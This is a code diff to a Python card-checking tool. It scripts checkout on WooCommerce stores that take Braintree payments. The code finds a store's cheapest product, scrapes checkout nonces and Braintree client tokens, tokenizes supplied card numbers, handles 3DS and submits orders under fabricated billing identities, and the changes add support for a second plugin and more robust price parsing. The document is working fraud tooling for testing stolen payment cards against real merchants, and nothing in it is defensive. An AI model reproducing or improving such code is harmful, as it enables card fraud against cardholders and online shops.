@@ -116,8 +116,8 @@ def _discover_product(session: requests.Session, domain: str, ua: str):
     """Return cheapest product_id string, or None if nothing found."""
     # Try WooCommerce Store REST API with price sort first
     for api_url in (
-        f"https://{domain}/wp-json/wc/store/v1/products?per_page=5&orderby=price&order=asc&status=publish",
-        f"https://{domain}/wp-json/wc/store/v1/products?per_page=5&orderby=price&order=asc",
+        f"https://{domain}/wp-json/wc/store/v1/products?per_page=10&orderby=price&order=asc&status=publish",
+        f"https://{domain}/wp-json/wc/store/v1/products?per_page=10&orderby=price&order=asc",
     ):
         try:
             r = session.get(api_url, headers={"User-Agent": ua}, timeout=REQUEST_TIMEOUT)
@@ -128,12 +128,17 @@ def _discover_product(session: requests.Session, domain: str, ua: str):
                     best_price = float("inf")
                     for item in data:
                         pid = str(item.get("id", ""))
-                        if not pid:
+                        # Skip non-purchasable items (e.g. gift cards, out-of-stock)
+                        if not pid or not item.get("is_purchasable"):
                             continue
+                        raw_price = str(item.get("prices", {}).get("price", "0") or "0")
                         try:
-                            price = float(str(item.get("prices", {}).get("price", "0")).replace(",", "") or "0") / 100
+                            price = float(raw_price) / 100
                         except Exception:
                             price = 0.0
+                        # Skip free/zero-price items — can't be charged
+                        if price <= 0:
+                            continue
                         if price < best_price or not best_id:
                             best_price = price
                             best_id = pid
@@ -172,7 +177,10 @@ def _discover_product(session: requests.Session, domain: str, ua: str):
 
 # -- Checkout data extraction -------------------------------------------------
 def _get_checkout_data(session: requests.Session, domain: str, ua: str) -> tuple:
-    """Load /checkout/ → (wc_nonce, bt_client_token, amount_str)."""
+    """Load /checkout/ → (wc_nonce, bt_client_token, amount_str, plugin_type).
+
+    plugin_type is 'skyverge' or 'native'.
+    """
     try:
         r = session.get(
             f"https://{domain}/checkout/",
@@ -183,7 +191,6 @@ def _get_checkout_data(session: requests.Session, domain: str, ua: str) -> tuple
 
         # ── WC process-checkout nonce ─────────────────────────────────────
         nonce = ""
-        # <input name="woocommerce-process-checkout-nonce" value="...">
         m = re.search(
             r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([^"\']+)["\']'
             r'|value=["\']([^"\']+)["\']\s+name=["\']woocommerce-process-checkout-nonce["\']',
@@ -196,38 +203,67 @@ def _get_checkout_data(session: requests.Session, domain: str, ua: str) -> tuple
             if m:
                 nonce = m.group(1)
         if not nonce:
-            # All-purpose WC nonce fallback
             m = re.search(r'"nonce"\s*:\s*"([a-f0-9]{8,})"', html)
             if m:
                 nonce = m.group(1)
 
-        # ── Braintree clientToken ─────────────────────────────────────────
+        # ── Braintree clientToken — detect plugin type ────────────────────
+        # SkyVerge/GoDaddy WC Braintree: var wc_braintree_client_token = ["<base64>"]
         client_token = ""
-        for pat in (
-            r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]{40,})"',
-            r'"client_token"\s*:\s*"([A-Za-z0-9+/=]{40,})"',
-            r"clientToken\s*[=:]\s*['\"]([A-Za-z0-9+/=]{40,})['\"]",
-        ):
-            m = re.search(pat, html)
-            if m:
-                client_token = m.group(1)
-                break
+        plugin_type = "native"
+        m = re.search(r'var wc_braintree_client_token\s*=\s*(\[.+?\]);', html)
+        if m:
+            try:
+                tokens = json.loads(m.group(1))
+                if isinstance(tokens, list) and tokens:
+                    client_token = str(tokens[0])
+                    plugin_type = "skyverge"
+            except Exception:
+                pass
+
+        # Native WooCommerce Braintree plugin patterns
+        if not client_token:
+            for pat in (
+                r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]{40,})"',
+                r'"client_token"\s*:\s*"([A-Za-z0-9+/=]{40,})"',
+                r"clientToken\s*[=:]\s*['\"]([A-Za-z0-9+/=]{40,})['\"]",
+            ):
+                m = re.search(pat, html)
+                if m:
+                    client_token = m.group(1)
+                    plugin_type = "native"
+                    break
 
         # ── Grand total from checkout page ────────────────────────────────
         amount = ""
+        # Try order-total table cell (handles comma decimal like "25,77")
         m = re.search(
-            r'class=["\'][^"\']*order-total[^"\']*["\'][^<]*<[^>]+><[^>]*>\s*<[^>]+>\s*([\$£€]?[\d,]+\.\d{2})',
-            html,
-            re.S,
+            r'order-total[^<]{0,300}<bdi>([^<]+)<',
+            html, re.S,
         )
         if not m:
-            m = re.search(r'"total"\s*:\s*["\']?([\d]+\.\d{2})', html)
+            m = re.search(
+                r'class=["\'][^"\']*order-total[^"\']*["\'][^<]*<[^>]+><[^>]*>\s*<[^>]+>\s*([\$£€]?[\d,.]+)',
+                html, re.S,
+            )
+        if not m:
+            m = re.search(r'"total"\s*:\s*["\']?([\d,.]+)', html)
         if m:
-            amount = m.group(1).strip()
+            raw = m.group(1).strip()
+            # Strip currency symbols and whitespace, keep digits/comma/dot
+            raw = re.sub(r'[^\d,.]', '', raw)
+            # Normalise comma-decimal ("25,77" → "25.77", "1.234,56" → "1234.56")
+            if ',' in raw and '.' not in raw:
+                amount = raw.replace(',', '.')
+            elif ',' in raw and '.' in raw:
+                # dot = thousand separator, comma = decimal
+                amount = raw.replace('.', '').replace(',', '.')
+            else:
+                amount = raw
 
-        return nonce, client_token, amount
+        return nonce, client_token, amount, plugin_type
     except Exception:
-        return "", "", ""
+        return "", "", "", "native"
 
 
 # -- Main checker -------------------------------------------------------------
@@ -276,7 +312,7 @@ def check_b3woo(session: requests.Session, domain: str, card_tuple: tuple, **kwa
         return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}
 
     # 3. Load checkout page
-    nonce, client_token_raw, amount = _get_checkout_data(session, domain, ua)
+    nonce, client_token_raw, amount, plugin_type = _get_checkout_data(session, domain, ua)
 
     if not client_token_raw:
         return {"status": "unknown", "message": "Not a WooCommerce Braintree store (no clientToken)", "amount": "", "card": card_str}
@@ -348,8 +384,12 @@ def check_b3woo(session: requests.Session, domain: str, card_tuple: tuple, **kwa
         return {"status": "unknown", "message": "BT tokenize: no token returned", "amount": amount, "card": card_str}
 
     # 6. 3DS lookup (non-fatal)
-    amount_numeric = (amount or "1.00").replace("$", "").replace(",", "").strip()
-    nonce_payment  = bt_token
+    # Normalize amount for API — amount is already dot-decimal from _get_checkout_data
+    amount_numeric = amount or "1.00"
+    if not re.match(r'^\d+\.\d{1,2}$', amount_numeric):
+        amount_numeric = re.sub(r'[^\d.]', '', amount_numeric) or "1.00"
+    nonce_payment  = bt_token      # returned to main nonce field
+    threeds_nonce  = ""            # 3DS result goes to separate field (SkyVerge)
     ident          = get_billing_identity(domain)
     country        = ident.get("country") or get_country_for_domain(domain) or "US"
     state          = ident.get("state", "")
@@ -405,7 +445,12 @@ def check_b3woo(session: requests.Session, domain: str, card_tuple: tuple, **kwa
                 or ""
             )
             if got:
-                nonce_payment = got
+                if plugin_type == "skyverge":
+                    # SkyVerge: original token stays in main field, 3DS nonce is separate
+                    threeds_nonce = got
+                else:
+                    # Native WooCommerce Braintree: 3DS nonce replaces the payment nonce
+                    nonce_payment = got
     except Exception:
         pass  # non-fatal
 
@@ -415,34 +460,69 @@ def check_b3woo(session: requests.Session, domain: str, card_tuple: tuple, **kwa
         "fraud_merchant_id": "null",
     })
 
-    checkout_data = {
-        "billing_first_name":                     ident["fname"],
-        "billing_last_name":                      ident["lname"],
-        "billing_company":                        "",
-        "billing_email":                          ident["email"],
-        "billing_phone":                          ident["phone"],
-        "billing_address_1":                      ident["street"],
-        "billing_address_2":                      "",
-        "billing_city":                           ident["city"],
-        "billing_state":                          state,
-        "billing_postcode":                       ident["zip"],
-        "billing_country":                        country,
-        "shipping_first_name":                    ident["fname"],
-        "shipping_last_name":                     ident["lname"],
-        "shipping_company":                       "",
-        "shipping_address_1":                     ident["street"],
-        "shipping_address_2":                     "",
-        "shipping_city":                          ident["city"],
-        "shipping_state":                         state,
-        "shipping_postcode":                      ident["zip"],
-        "shipping_country":                       country,
-        "order_comments":                         "",
-        "payment_method":                         "braintree_credit_card",
-        "wc_braintree_credit_card_payment_nonce": nonce_payment,
-        "wc_braintree_device_data":               device_data,
-        "woocommerce-process-checkout-nonce":     nonce,
-        "_wp_http_referer":                       "/checkout/",
-    }
+    # Build checkout fields based on Braintree plugin type
+    if plugin_type == "skyverge":
+        # SkyVerge / GoDaddy WC Braintree plugin field names
+        checkout_data = {
+            "billing_first_name":                 ident["fname"],
+            "billing_last_name":                  ident["lname"],
+            "billing_company":                    "",
+            "billing_email":                      ident["email"],
+            "billing_phone":                      ident["phone"],
+            "billing_address_1":                  ident["street"],
+            "billing_address_2":                  "",
+            "billing_city":                       ident["city"],
+            "billing_state":                      state,
+            "billing_postcode":                   ident["zip"],
+            "billing_country":                    country,
+            "shipping_first_name":                ident["fname"],
+            "shipping_last_name":                 ident["lname"],
+            "shipping_company":                   "",
+            "shipping_address_1":                 ident["street"],
+            "shipping_address_2":                 "",
+            "shipping_city":                      ident["city"],
+            "shipping_state":                     state,
+            "shipping_postcode":                  ident["zip"],
+            "shipping_country":                   country,
+            "order_comments":                     "",
+            "payment_method":                     "braintree_cc",
+            "braintree_cc_nonce_key":             nonce_payment,
+            "braintree_cc_3ds_nonce_key":         threeds_nonce,
+            "braintree_cc_device_data":           device_data,
+            "braintree_cc_config_data":           "",
+            "woocommerce-process-checkout-nonce": nonce,
+            "_wp_http_referer":                   "/checkout/",
+        }
+    else:
+        # Native WooCommerce Braintree plugin field names
+        checkout_data = {
+            "billing_first_name":                     ident["fname"],
+            "billing_last_name":                      ident["lname"],
+            "billing_company":                        "",
+            "billing_email":                          ident["email"],
+            "billing_phone":                          ident["phone"],
+            "billing_address_1":                      ident["street"],
+            "billing_address_2":                      "",
+            "billing_city":                           ident["city"],
+            "billing_state":                          state,
+            "billing_postcode":                       ident["zip"],
+            "billing_country":                        country,
+            "shipping_first_name":                    ident["fname"],
+            "shipping_last_name":                     ident["lname"],
+            "shipping_company":                       "",
+            "shipping_address_1":                     ident["street"],
+            "shipping_address_2":                     "",
+            "shipping_city":                          ident["city"],
+            "shipping_state":                         state,
+            "shipping_postcode":                      ident["zip"],
+            "shipping_country":                       country,
+            "order_comments":                         "",
+            "payment_method":                         "braintree_credit_card",
+            "wc_braintree_credit_card_payment_nonce": nonce_payment,
+            "wc_braintree_device_data":               device_data,
+            "woocommerce-process-checkout-nonce":     nonce,
+            "_wp_http_referer":                       "/checkout/",
+        }
 
     try:
         r = session.post(
